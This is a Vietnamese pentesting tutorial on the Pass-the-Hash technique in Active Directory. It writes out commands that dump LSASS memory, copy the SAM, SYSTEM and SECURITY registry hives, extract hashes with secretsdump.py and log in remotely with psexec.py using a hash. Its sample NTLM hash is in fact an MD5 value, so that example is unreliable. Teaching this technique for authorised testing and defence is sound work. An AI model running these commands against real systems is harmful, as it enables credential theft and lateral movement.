---
title: Pass The Hash
date: 2025-08-13 22:50:30 +/-TTTT
categories: [Pentesting, AD]
tags: [Active Directory Pentesting] 

image:
  path: /assets/img/AD/AD.png
#   alt: image alternative text
---


### Giới thiệu
Pass the Hash (Pth) là một kỹ thuật dùng NTLM hash nổi tiếng trong Red Team / Pentest, cho phép kẻ tấn công xác thực vào các hệ thống Windows **mà không cần biết mật khẩu gốc**, chỉ cần có **hash (băm)** của mật khẩu đó.
- Khi người dùng đăng nhập, Windows không lưu mật khẩu dạng rõ (plaintext), mà lưu **hash** (thường là NTLM hash).
- Nếu attacker lấy được NTLM hash, họ có thể dùng nó **để đăng nhập như thể có mật khẩu thật**, **không cần crack**.

### Điều kiện khai thác
- Kẻ tấn công có quyền đọc hash trên máy đã xâm nhập (thường là **local admin**) và đích **chấp nhận NTLM** (SMB/WMI/WinRM…):
	- Truy xuất **LSASS** (dump hash NTLM của tài khoản đang logon) hoặc đọc **SAM, SECURITY, SYSTEM**
- - Máy đích **cho phép NTLM** (nhiều dịch vụ Windows vẫn hỗ trợ).
    
- Đường đi lateral mở: **SMB 445**, **WMI (DCOM/135 + dynamic ports)**, **WinRM 5985/5986**, đôi khi **RDP 3389**.
    
- **Mật khẩu local admin trùng nhau** trên nhiều máy (thiếu LAPS) → lateral cực dễ.

### Kỹ thuật hoạt động của Pass the Hash
- Lợi dụng việc các giao thức như SMB, WMI, WinRM… chấp nhận **NTLM authentication**
- Kẻ tấn công "inject" hash vào phiên làm việc hoặc dùng công cụ để xác thực từ xa bằng hash đó

### Tool
{% raw %}
| **Công cụ** | **Mô tả** |
| --- | --- | 
| mimikatz | Inject hash vào tiến trình hiện tại |
| psexec.py (Impacket) | Kết nối từ xa qua SMB bằng hash |
| wmiexec.py (Impacket) | Thực thi lệnh từ xa bằng hash |
| pth-winexe, pth-smbclient | Dùng trong môi trường Linux để xác thực bằng hash |
{% endraw %}


### Chuỗi tấn công Pash the Hash
**1. Foothold** trên 1 endpoint.
    
**2. Thu thập hash**: đọc từ **LSASS**/**SAM** 

 LSASS lưu credential người dùng đăng nhập gần đây.
 
	 Dump trực tiếp từ task:
		
		tasklist | findstr lsass
		procdump.exe -accepteula -ma <PID> lsass.dmp
		
		
	 Dùng PowerShell:
		
		rundll32.exe comsvcs.dll, MiniDump <PID> lsass.dmp full
		

	 Dump từ Task Manager (GUI):
	 
	   Bước 1: Mở Task Manager
		   - Nhấn Ctrl + Shift + Esc hoặc chuột phải Taskbar → chọn **Task Manager**
	   Bước 2: Chuyển sang tab Details
		   - Tìm tiến trình tên lsass.exe
	   Bước 3: Dump file
		   - Chuột phải vào lsass.exe → chọn **"Create dump file"**
	   Bước 4: Xem vị trí file dump
		   - Windows sẽ tạo lsass.DMP tại: C:\Users\<YourUser>\AppData\Local\Temp\lsass.DMP

Dump file chứa Hash và Credential

	- SAM, SYSTEM, SECURITY – chứa local hash và policy -> thực hiện copy 3 file 
		
		copy C:\Windows\System32\config\SAM C:\Temp\SAM
		copy C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
		copy C:\Windows\System32\config\SECURITY C:\Temp\SECURITY
		
		
	- Sử dụng secretsdump.py (Impacket) hoặc mimikatz để extract hash
	
	- link tool impacket https://github.com/fortra/impacket.git
		
		secretsdump.py -system SYSTEM -sam SAM -security SECURITY LOCAL
		
	VD: dump được NTLM hash của user admin 
		Username: admin 
		NTLM: aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
		Thực hiện kết nối SMB từ xa bằng hash:
		 psexec.py 'DOMAIN/admin@10.10.10.10' -hashes :5f4dcc3b5aa765d61d8327deb882cf99
	
		

  
**3. Tái sử dụng hash** để xác thực NTLM tới máy khác (SMB/WMI/WinRM).
    
**4. Thực thi từ xa**: tạo service tạm, WMI process, hoặc WinRM session.
    
**5. Mở rộng quyền**: tìm tài khoản có quyền cao hơn; di chuyển tới **server nhạy cảm/DC**.




